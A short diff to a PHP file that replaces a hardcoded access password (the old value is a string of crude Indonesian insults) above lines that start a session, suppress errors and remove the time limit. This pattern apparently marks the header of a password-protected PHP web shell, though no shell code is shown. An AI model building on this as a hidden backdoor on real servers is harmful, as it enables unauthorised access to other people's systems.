@@ -1,5 +1,5 @@
 <?php
-$password = "Ngentot lu anjing tukang tikung kontol ibu lu mati jadi anjing"; // passwod
+$password = "Masukindong@1337"; // passwod
 session_start();
 error_reporting(0);
 set_time_limit(0);
